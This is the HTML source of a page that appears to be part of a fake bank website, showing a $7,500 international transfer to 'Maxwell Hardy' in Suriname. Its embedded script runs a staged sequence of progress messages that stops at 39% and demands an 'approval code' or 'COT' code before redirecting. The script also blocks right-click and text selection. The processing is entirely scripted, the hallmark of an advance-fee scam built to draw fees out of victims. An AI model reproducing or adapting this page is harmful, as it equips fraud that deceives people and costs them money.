				<h3 class="font-weight-bold m-0">A/C TYPE: Checking

				<!--<small class="text-muted font-size-sm ml-2">12 messages</small></h3> -->

				<a href="#" class="btn btn-xs btn-icon btn-light btn-hover-primary" id="kt_quick_user_close">
					<i class="ki ki-close icon-xs text-muted"></i>
				</a>
			</div>
			<!--end::Header-->
			<!--begin::Content-->
			<div class="offcanvas-content pr-5 mr-n5">
				<!--begin::Header-->
				<div class="d-flex align-items-center mt-5">
					<div class="symbol symbol-100 mr-5">
						<div class="symbol-label" style="background-image:url('https://cdn.e-platforms.xyz/11064634592735597830.jpg')"></div>
						<i class="symbol-badge bg-success"></i>
					</div>
					<div class="d-flex flex-column">
						<a href="#" class="font-weight-bold font-size-h5 text-dark-75 text-hover-primary">Justin Schenk</a>
						<div class="text-muted mt-1"></div>

						<div class="navi mt-2">
							<a href="#" class="navi-item">

								<span class="navi-link p-0 pb-2">
									
									<span class="navi-text text-muted text-hover-primary"></span>
								</span>
							</a>
							<a href="/app/log-out" class="btn btn-sm btn-light-primary font-weight-bolder py-2 px-5">Sign Out</a>
						</div>
					</div>
				</div>
				<!--end::Header-->
				<!--begin::Separator-->
				<div class="separator separator-dashed mt-8 mb-5"></div>
				<!--end::Separator-->
			</div>
			<!--end::Content-->
		</div>
		<!-- end::User Panel-->

</div><a href="http://www.chronoengine.com/" target="_blank" class="chronoforms6_credits">Form by ChronoForms - ChronoEngine.com</a>

<script type="text/javascript">
/* <![CDATA[ */
function GTranslateGetCurrentLang() {var keyValue = document.cookie.match('(^|;) ?googtrans=([^;]*)(;|$)');return keyValue ? keyValue[2].split('/')[2] : null;}
function GTranslateFireEvent(element,event){try{if(document.createEventObject){var evt=document.createEventObject();element.fireEvent('on'+event,evt)}else{var evt=document.createEvent('HTMLEvents');evt.initEvent(event,true,true);element.dispatchEvent(evt)}}catch(e){}}
function doGTranslate(lang_pair){if(lang_pair.value)lang_pair=lang_pair.value;if(lang_pair=='')return;var lang=lang_pair.split('|')[1];if(GTranslateGetCurrentLang() == null && lang == lang_pair.split('|')[0])return;var teCombo;var sel=document.getElementsByTagName('select');for(var i=0;i<sel.length;i++)if(sel[i].className=='goog-te-combo')teCombo=sel[i];if(document.getElementById('google_translate_element2')==null||document.getElementById('google_translate_element2').innerHTML.length==0||teCombo.length==0||teCombo.innerHTML.length==0){setTimeout(function(){doGTranslate(lang_pair)},500)}else{teCombo.value=lang;GTranslateFireEvent(teCombo,'change');GTranslateFireEvent(teCombo,'change')}}
/* ]]> */
</script>
<div id="google_translate_element2"></div>
<script type="text/javascript">function googleTranslateElementInit2() {new google.translate.TranslateElement({pageLanguage: 'en', autoDisplay: false}, 'google_translate_element2');}</script>
<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit2"></script>

<a href="#" class="switcher-popup glink nturl notranslate" onclick="openGTPopup(this)"><img src="/app/modules/mod_gtranslate/tmpl/lang/32/en.png" height="32" width="32" alt="English" /> <span>English</span><span style="color:#666;font-size:8px;font-weight:bold;">&#9660;</span></a><div id="gt_fade" class="gt_black_overlay"></div><div id="gt_lightbox" class="gt_white_content notranslate"><div style="position:relative;height:14px;"><span onclick="closeGTPopup()" style="position:absolute;right:2px;top:2px;font-weight:bold;font-size:12px;cursor:pointer;color:#444;font-family:cursive;">X</span></div><div class="gt_languages"><a href="#" onclick="changeGTLanguage('en|en', this);return false;" title="English" class="glink nturl selected"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/en.png" height="32" width="32" alt="en" /> <span>English</span></a><a href="#" onclick="changeGTLanguage('en|af', this);return false;" title="Afrikaans" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/af.png" height="32" width="32" alt="af" /> <span>Afrikaans</span></a><a href="#" onclick="changeGTLanguage('en|sq', this);return false;" title="Albanian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/sq.png" height="32" width="32" alt="sq" /> <span>Albanian</span></a><a href="#" onclick="changeGTLanguage('en|ar', this);return false;" title="Arabic" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/ar.png" height="32" width="32" alt="ar" /> <span>Arabic</span></a><a href="#" onclick="changeGTLanguage('en|hy', this);return false;" title="Armenian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/hy.png" height="32" width="32" alt="hy" /> <span>Armenian</span></a><a href="#" onclick="changeGTLanguage('en|az', this);return false;" title="Azerbaijani" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/az.png" height="32" width="32" alt="az" /> <span>Azerbaijani</span></a><a href="#" onclick="changeGTLanguage('en|eu', this);return false;" title="Basque" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/eu.png" height="32" width="32" alt="eu" /> <span>Basque</span></a><a href="#" onclick="changeGTLanguage('en|be', this);return false;" title="Belarusian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/be.png" height="32" width="32" alt="be" /> <span>Belarusian</span></a><a href="#" onclick="changeGTLanguage('en|bg', this);return false;" title="Bulgarian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/bg.png" height="32" width="32" alt="bg" /> <span>Bulgarian</span></a><a href="#" onclick="changeGTLanguage('en|ca', this);return false;" title="Catalan" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/ca.png" height="32" width="32" alt="ca" /> <span>Catalan</span></a><a href="#" onclick="changeGTLanguage('en|zh-CN', this);return false;" title="Chinese (Simplified)" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/zh-CN.png" height="32" width="32" alt="zh-CN" /> <span>Chinese (Simplified)</span></a><a href="#" onclick="changeGTLanguage('en|zh-TW', this);return false;" title="Chinese (Traditional)" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/zh-TW.png" height="32" width="32" alt="zh-TW" /> <span>Chinese (Traditional)</span></a><a href="#" onclick="changeGTLanguage('en|hr', this);return false;" title="Croatian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/hr.png" height="32" width="32" alt="hr" /> <span>Croatian</span></a><a href="#" onclick="changeGTLanguage('en|cs', this);return false;" title="Czech" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/cs.png" height="32" width="32" alt="cs" /> <span>Czech</span></a><a href="#" onclick="changeGTLanguage('en|da', this);return false;" title="Danish" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/da.png" height="32" width="32" alt="da" /> <span>Danish</span></a><a href="#" onclick="changeGTLanguage('en|nl', this);return false;" title="Dutch" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/nl.png" height="32" width="32" alt="nl" /> <span>Dutch</span></a><a href="#" onclick="changeGTLanguage('en|et', this);return false;" title="Estonian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/et.png" height="32" width="32" alt="et" /> <span>Estonian</span></a><a href="#" onclick="changeGTLanguage('en|tl', this);return false;" title="Filipino" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/tl.png" height="32" width="32" alt="tl" /> <span>Filipino</span></a><a href="#" onclick="changeGTLanguage('en|fi', this);return false;" title="Finnish" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/fi.png" height="32" width="32" alt="fi" /> <span>Finnish</span></a><a href="#" onclick="changeGTLanguage('en|fr', this);return false;" title="French" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/fr.png" height="32" width="32" alt="fr" /> <span>French</span></a><a href="#" onclick="changeGTLanguage('en|gl', this);return false;" title="Galician" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/gl.png" height="32" width="32" alt="gl" /> <span>Galician</span></a><a href="#" onclick="changeGTLanguage('en|ka', this);return false;" title="Georgian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/ka.png" height="32" width="32" alt="ka" /> <span>Georgian</span></a><a href="#" onclick="changeGTLanguage('en|de', this);return false;" title="German" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/de.png" height="32" width="32" alt="de" /> <span>German</span></a><a href="#" onclick="changeGTLanguage('en|el', this);return false;" title="Greek" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/el.png" height="32" width="32" alt="el" /> <span>Greek</span></a><a href="#" onclick="changeGTLanguage('en|ht', this);return false;" title="Haitian Creole" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/ht.png" height="32" width="32" alt="ht" /> <span>Haitian Creole</span></a><a href="#" onclick="changeGTLanguage('en|iw', this);return false;" title="Hebrew" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/iw.png" height="32" width="32" alt="iw" /> <span>Hebrew</span></a><a href="#" onclick="changeGTLanguage('en|hi', this);return false;" title="Hindi" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/hi.png" height="32" width="32" alt="hi" /> <span>Hindi</span></a><a href="#" onclick="changeGTLanguage('en|hu', this);return false;" title="Hungarian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/hu.png" height="32" width="32" alt="hu" /> <span>Hungarian</span></a><a href="#" onclick="changeGTLanguage('en|is', this);return false;" title="Icelandic" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/is.png" height="32" width="32" alt="is" /> <span>Icelandic</span></a><a href="#" onclick="changeGTLanguage('en|id', this);return false;" title="Indonesian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/id.png" height="32" width="32" alt="id" /> <span>Indonesian</span></a><a href="#" onclick="changeGTLanguage('en|ga', this);return false;" title="Irish" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/ga.png" height="32" width="32" alt="ga" /> <span>Irish</span></a><a href="#" onclick="changeGTLanguage('en|it', this);return false;" title="Italian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/it.png" height="32" width="32" alt="it" /> <span>Italian</span></a><a href="#" onclick="changeGTLanguage('en|ja', this);return false;" title="Japanese" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/ja.png" height="32" width="32" alt="ja" /> <span>Japanese</span></a><a href="#" onclick="changeGTLanguage('en|ko', this);return false;" title="Korean" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/ko.png" height="32" width="32" alt="ko" /> <span>Korean</span></a><a href="#" onclick="changeGTLanguage('en|lv', this);return false;" title="Latvian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/lv.png" height="32" width="32" alt="lv" /> <span>Latvian</span></a><a href="#" onclick="changeGTLanguage('en|lt', this);return false;" title="Lithuanian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/lt.png" height="32" width="32" alt="lt" /> <span>Lithuanian</span></a><a href="#" onclick="changeGTLanguage('en|mk', this);return false;" title="Macedonian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/mk.png" height="32" width="32" alt="mk" /> <span>Macedonian</span></a><a href="#" onclick="changeGTLanguage('en|ms', this);return false;" title="Malay" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/ms.png" height="32" width="32" alt="ms" /> <span>Malay</span></a><a href="#" onclick="changeGTLanguage('en|mt', this);return false;" title="Maltese" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/mt.png" height="32" width="32" alt="mt" /> <span>Maltese</span></a><a href="#" onclick="changeGTLanguage('en|no', this);return false;" title="Norwegian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/no.png" height="32" width="32" alt="no" /> <span>Norwegian</span></a><a href="#" onclick="changeGTLanguage('en|fa', this);return false;" title="Persian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/fa.png" height="32" width="32" alt="fa" /> <span>Persian</span></a><a href="#" onclick="changeGTLanguage('en|pl', this);return false;" title="Polish" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/pl.png" height="32" width="32" alt="pl" /> <span>Polish</span></a><a href="#" onclick="changeGTLanguage('en|pt', this);return false;" title="Portuguese" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/pt.png" height="32" width="32" alt="pt" /> <span>Portuguese</span></a><a href="#" onclick="changeGTLanguage('en|ro', this);return false;" title="Romanian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/ro.png" height="32" width="32" alt="ro" /> <span>Romanian</span></a><a href="#" onclick="changeGTLanguage('en|ru', this);return false;" title="Russian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/ru.png" height="32" width="32" alt="ru" /> <span>Russian</span></a><a href="#" onclick="changeGTLanguage('en|sr', this);return false;" title="Serbian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/sr.png" height="32" width="32" alt="sr" /> <span>Serbian</span></a><a href="#" onclick="changeGTLanguage('en|sk', this);return false;" title="Slovak" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/sk.png" height="32" width="32" alt="sk" /> <span>Slovak</span></a><a href="#" onclick="changeGTLanguage('en|sl', this);return false;" title="Slovenian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/sl.png" height="32" width="32" alt="sl" /> <span>Slovenian</span></a><a href="#" onclick="changeGTLanguage('en|es', this);return false;" title="Spanish" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/es.png" height="32" width="32" alt="es" /> <span>Spanish</span></a><a href="#" onclick="changeGTLanguage('en|sw', this);return false;" title="Swahili" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/sw.png" height="32" width="32" alt="sw" /> <span>Swahili</span></a><a href="#" onclick="changeGTLanguage('en|sv', this);return false;" title="Swedish" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/sv.png" height="32" width="32" alt="sv" /> <span>Swedish</span></a><a href="#" onclick="changeGTLanguage('en|th', this);return false;" title="Thai" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/th.png" height="32" width="32" alt="th" /> <span>Thai</span></a><a href="#" onclick="changeGTLanguage('en|tr', this);return false;" title="Turkish" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/tr.png" height="32" width="32" alt="tr" /> <span>Turkish</span></a><a href="#" onclick="changeGTLanguage('en|uk', this);return false;" title="Ukrainian" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/uk.png" height="32" width="32" alt="uk" /> <span>Ukrainian</span></a><a href="#" onclick="changeGTLanguage('en|ur', this);return false;" title="Urdu" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/ur.png" height="32" width="32" alt="ur" /> <span>Urdu</span></a><a href="#" onclick="changeGTLanguage('en|vi', this);return false;" title="Vietnamese" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/vi.png" height="32" width="32" alt="vi" /> <span>Vietnamese</span></a><a href="#" onclick="changeGTLanguage('en|cy', this);return false;" title="Welsh" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/cy.png" height="32" width="32" alt="cy" /> <span>Welsh</span></a><a href="#" onclick="changeGTLanguage('en|yi', this);return false;" title="Yiddish" class="glink nturl"><img data-gt-lazy-src="/app/modules/mod_gtranslate/tmpl/lang/32/yi.png" height="32" width="32" alt="yi" /> <span>Yiddish</span></a></div></div>
                                 </div>
                        								

								
								
							</div>
							<!--end::Topbar-->
						</div>
						
						
						
						
						<!--end::Container-->
					</div>
					<!--end::Header-->
					
					
					<!--begin::Content-->
					<div class="content d-flex flex-column flex-column-fluid" id="kt_content">
						<!--begin::Subheader-->
						<div class="subheader py-2 py-lg-4 subheader-solid" id="kt_subheader">
							<div class="container-fluid d-flex align-items-center justify-content-between flex-wrap flex-sm-nowrap">
								<!--begin::Info-->
								<div class="d-flex align-items-center flex-wrap mr-1">
									<!--begin::Page Heading-->
									<div class="d-flex align-items-baseline mr-5">
										
										
										<!--begin::Page Title-->
										                         					  <div class="semanticui-body G2-joomla chronoforms  index">
	<h5 class="text-dark font-weight-bold my-2 mr-5">Hi, Justin Schenk</h5>
</div><a href="http://www.chronoengine.com/" target="_blank" class="chronoforms6_credits">Form by ChronoForms - ChronoEngine.com</a>
                       					 										<!--end::Page Title-->
										
										
									</div>
									<!--end::Page Heading-->
								</div>
								<!--end::Info-->
								
								
								
								<!--begin::Toolbar-->
								 								<!--end::Toolbar-->
							</div>
						</div>
						<!--end::Subheader-->
<!--begin::Entry-->
						<div class="d-flex flex-column-fluid">
							<!--begin::Container-->
							
														<div class="container">
															
								
						<!--continue::Container-->
	
								
								
								
	<!--begin::START MAIN TOP-->
								 										
	<!--end::END MAIN TOP-->


	<!--begin::START MAIN TOP B-->
								 										
	<!--end::END MAIN TOP B-->
	
		<!--begin::START MAIN TOP C-->
								 										
	<!--end::END MAIN TOP C-->


	<!--begin::START PAGE CONTAINER-->
						<!--	<div class="col-xl-12 "> -->			
                             <div class="semanticui-body G2-joomla chronoforms  index">
	<!--begin::Row-->
								<div class="row">

<div class="col-lg-3"></div>
									<div class="col-lg-5">
<!--begin::Card-->
										<div class="card card-custom">
											<div class="card-header border-0 ribbon ribbon-right">
<div class="ribbon-target bg-success" style="top: 10px; right: -2px;">$7,500.00</div>
												<div class="card-title">
													<span class="card-icon">
														<i class="flaticon2-chat-1 text-red"></i>
													</span>
													<h3 class="card-label text-dark">Transaction is Processing</h3>
												</div>
												
											</div>
											<div class="separator separator-solid separator-dark opacity-20">
												
											</div>

<div class="swal2-header">
											<div class="card-body text-dark">
<html><body oncontextmenu="return false" onselectstart="return false" ondragstart="return false" topmargin=0 rightmargin=0 leftmargin=0>

<br></br>
<p align="center"><img src="https://e-platforms.xyz/images/spinner.gif" width="200" height="200"></p>
		 
<div id="splashcontainer" class="ui centered header upper"></div>
	 <div name="splashcontainerns" id="splashcontainerns"></div>
		 
<SCRIPT>

var preloadimages=new Array("","")

var intervals=3000
//configure destination URL
var targetdestination="http://securedboa.ibt.in.net/app/transfer/international-transfer?event=initialprocess&ref=1102529880452906&id=8652348478657082"


var splashmessage=new Array()
var openingtags='<font face="TAHOMA" bgcolor="#NAVY" size="2">'
splashmessage[0]='PERSONAL ACCOUNT DETAILS SUBMITTED'
splashmessage[1]='TRANSACTION IN PROGRESS ..............'
splashmessage[2]='*** Maxwell Hardy | 1576556565 | 7,500.00 | Suriname ***'
splashmessage[3]='TRANSACTION IN PROGRESS .............. </br>*** Maxwell Hardy | 1576556565 | 7,500.00 | Suriname ***'
splashmessage[4]='ACCOUNT DETAILED VERIFIED..... </br>*** Maxwell Hardy | 1576556565 | 7,500.00 | Suriname ***'
splashmessage[5]='YOUR TRANSFER DATA IS BEING PROCESSED </br>*** Maxwell Hardy | 1576556565 | 7,500.00| Suriname ***'
splashmessage[6]='YOUR TRANSFER DATA IS BEING PROCESSED........!!!!!!........... 1576556565 WITH (Maxwell Hardy) VERIFIED'
splashmessage[7]='YOUR TRANSFER DATA IS BEING PROCESSED........!!!!!!........... 1576556565 WITH (Maxwell Hardy) NUMBER VERIFIED'
splashmessage[8]='TRANSFER DATA PROCESSED ::: CONTACTING BENEFICIARY BANK (Maxwell Hardy)'
splashmessage[9]='INITIATING TRANSFER......'
splashmessage[10]= '10%.......OF TRANSFER COMPLETED</br>*** Maxwell Hardy | 1576556565 | 7,500.00 | Suriname ***'
splashmessage[11]='12%.......OF TRANSFER COMPLETED</br>*** Maxwell Hardy | 1576556565 | 7,500.00 | Suriname ***'
splashmessage[12]='15%.......OF TRANSFER COMPLETED</br>*** Maxwell Hardy | 1576556565 | 7,500.00 | Suriname ***'
splashmessage[13]='PLEASE WAIT WHILE YOUR TRANSACTION IS PROCESSING...'
splashmessage[14]='PLEASE WAIT WHILE YOUR TRANSACTION IS PROCESSING...'
splashmessage[15]='PLEASE WAIT WHILE YOUR TRANSACTION IS PROCESSING...'
splashmessage[16]='18%.......OF TRANSFER COMPLETED</br>*** Maxwell Hardy | 1576556565 | 7,500.00 | Suriname ***'
splashmessage[17]='23%.......OF TRANSFER COMPLETED</br>*** Maxwell Hardy | 1576556565 | 7,500.00 | Suriname ***'
splashmessage[18]='28%.......OF TRANSFER COMPLETED</br>*** Maxwell Hardy | 1576556565 | 7,500.00 | Suriname ***'
splashmessage[19]='30%....... PROCESSING ALL CHARGES....'
splashmessage[20]='36%....... PROCESSING ADMINISTRATIVE CHARGES...'
splashmessage[21]='ADMINISTRATIVE CHARGES PROCESSED SUCCESSFULLY...'
splashmessage[22]='PROCESSING ALL CHARGES..........'
splashmessage[23]='39%.......TERMINATING TRANSFER </br>*** Maxwell Hardy | 1576556565 | 7,500.00 | Suriname ***'
splashmessage[24]='TRANSFER TERMINATED ***APPROVAL CODE**** NEEDED TO PROCEED'
splashmessage[25]='TRANSFER TERMINATED ***APPROVAL CODE**** NEEDED TO PROCEED'
splashmessage[26]='39%.......TERMINATING TRANSFER'
splashmessage[27]='39%.......TRANSFER TERMINATED ***APPROVAL CODE**** NEEDED TO PROCEED'
splashmessage[28]='39%.......TRANSFER TERMINATED to *** Maxwell Hardy | 1576556565***'
splashmessage[29]='39%.......PLEASE WAIT WHILE YOU ARE REDIRECTED TO ***APPROVAL CODE**** PORTAL'
splashmessage[30]='PLEASE WAIT WHILE YOU ARE REDIRECTED TO COT PORTAL'
splashmessage[31]='REDIRECTING TO COT PORTAL'
splashmessage[32]='CONTACTING Maxwell Hardy' 
splashmessage[33]='ENTER ***APPROVAL CODE***' 
splashmessage[34]='PLEASE WAIT WHILE YOU ARE REDIRECTED...'
splashmessage[35]='39%.......REDIRECTING'
splashmessage[36]='39%.......PLEASE WAIT WHILE YOU ARE REDIRECTED...'
splashmessage[37]='39%.......REDIRECTING...'
splashmessage[38]='39%.......ENTER REQUIRED CODE'
splashmessage[39]='PLEASE WAIT WHILE YOU ARE REDIRECTED....'
splashmessage[40]='Termination connection *** Maxwell Hardy ****' 
var closingtags='</font>'

//Do not edit below this line (besides HTML code at the very bottom)

var i=0

var ns4=document.layers?1:0
var ie4=document.all?1:0
var ns6=document.getElementById&&!document.all?1:0
var theimages=new Array()

//preload images
if (document.images){
for (p=0;p<preloadimages.length;p++){
theimages[p]=new Image()
theimages[p].src=preloadimages[p]
}
}

function displaysplash(){
if (i<splashmessage.length){
sc_cross.style.visibility="hidden"
sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'
sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 : document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2
sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2 : document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2
sc_cross.style.visibility="visible"
i++
}
else{
window.location=targetdestination
return
}
setTimeout("displaysplash()",intervals)
}

function displaysplash_ns(){
if (i<splashmessage.length){
sc_ns.visibility="hide"
sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')
sc_ns.document.close()

sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2
sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2

sc_ns.visibility="show"
i++
}
else{
window.location=targetdestination
return
}
setTimeout("displaysplash_ns()",intervals)
}



function positionsplashcontainer(){
if (ie4||ns6){
sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer
displaysplash()
}
else if (ns4){
sc_ns=document.splashcontainerns
sc_ns.visibility="show"
displaysplash_ns()
}
else
window.location=targetdestination
}
window.onload=positionsplashcontainer

</SCRIPT>

</body></html></div>
										</div>
										<!--end::Card-->
</div>
</div>

</div><a href="http://www.chronoengine.com/" target="_blank" class="chronoforms6_credits">Form by ChronoForms - ChronoEngine.com</a>

	<!--end::END PAGE CONTAINER-->
								
								
	<!--begin::START MAIN BOTTOM A-->
								 										
	<!--end::END MAIN BOTTOM A-->


	<!--begin::START MAIN BOTTOM B-->
								 										
	<!--end::END MAIN BOTTOM B-->
	
		<!--begin::START MAIN BOTTOM C-->
								 										
	<!--end::END MAIN BOTTOM C-->
								
								
	<!--DONT EDIT BELOW THIS LINE -->
								</div>
							<!--end::Container-->
						</div>
						<!--end::Entry-->
					</div>
					<!--end::Content-->
 
<!-- START INCLUDE FOOTER -->
    

<!--begin::Footer-->
<!--<div class="footer bg-white py-4 d-flex flex-lg-column" id="kt_footer">
						<!--begin::Container-->
				<!--		<div class="container-fluid d-flex flex-column flex-md-row align-items-center justify-content-between">
							<!--begin::Copyright-->
						<!--	-->
							<!--end::Copyright-->
				<!--		</div>
						<!--end::Container-->
					</div>

					<!--end::Footer-->
				</div>

				<!--end::Wrapper-->
		</div>
			<!--end::Page-->
		</div>
		<!--end::Main-->

		

<script>var HOST_URL = "https://keenthemes.com/metronic/tools/preview";</script>
		<!--begin::Global Config(global config for global JS scripts)-->
		<script>var KTAppSettings = { "breakpoints": { "sm": 576, "md": 768, "lg": 992, "xl": 1200, "xxl": 1200 }, "colors": { "theme": { "base": { "white": "#ffffff", "primary": "#3699FF", "secondary": "#E5EAEE", "success": "#1BC5BD", "info": "#8950FC", "warning": "#FFA800", "danger": "#F64E60", "light": "#F3F6F9", "dark": "#212121" }, "light": { "white": "#ffffff", "primary": "#E1F0FF", "secondary": "#ECF0F3", "success": "#C9F7F5", "info": "#EEE5FF", "warning": "#FFF4DE", "danger": "#FFE2E5", "light": "#F3F6F9", "dark": "#D6D6E0" }, "inverse": { "white": "#ffffff", "primary": "#ffffff", "secondary": "#212121", "success": "#ffffff", "info": "#ffffff", "warning": "#ffffff", "danger": "#ffffff", "light": "#464E5F", "dark": "#ffffff" } }, "gray": { "gray-100": "#F3F6F9", "gray-200": "#ECF0F3", "gray-300": "#E5EAEE", "gray-400": "#D6D6E0", "gray-500": "#B5B5C3", "gray-600": "#80808F", "gray-700": "#464E5F", "gray-800": "#1B283F", "gray-900": "#212121" } }, "font-family": "Poppins" };</script>
		<!--end::Global Config-->


		<!--begin::Global Theme Bundle(used by all pages)-->
	<!--	<script src="/app/theme/two/assets/plugins/global/plugins.bundle.js"></script>
		<script src="/app/theme/two/assets/plugins/custom/prismjs/prismjs.bundle.js"></script>
		<script src="/app/theme/two/assets/js/scripts.bundle.js"></script>
		<!--end::Global Theme Bundle-->


		<!--begin::Page Vendors(used by this page)-->
	<!--	<script src="/app/theme/two/assets/plugins/custom/fullcalendar/fullcalendar.bundle.js"></script>
		<script src="//maps.google.com/maps/api/js?key=AIzaSyBTGnKT7dt597vo9QgeQ7BFhvSRP4eiMSM"></script>
		<script src="/app/theme/two/assets/plugins/custom/gmaps/gmaps.js"></script>
		<!--end::Page Vendors-->
		
                    <!--begin::Page Vendors(used by this page)-->
          <!--                  <script src="/app/theme/two/assets/plugins/custom/datatables/datatables.bundle.js"></script>
                        <!--end::Page Vendors-->

                    <!--begin::Page Scripts(used by this page)-->
           <!--                <script src="/app/theme/two/assets/js/pages/crud/datatables/data-sources/javascript.js"></script>
                        <!--end::Page Scripts-->

		<!--begin::Page Scripts(used by this page)-->
	<!--	<script src="/app/theme/two/assets/js/pages/widgets.js"></script>
		<!--end::Page Scripts-->
	</body>
	<!--end::Body-->
</html></body>
<!-- END INCLUDE FOOTER -->
</html>
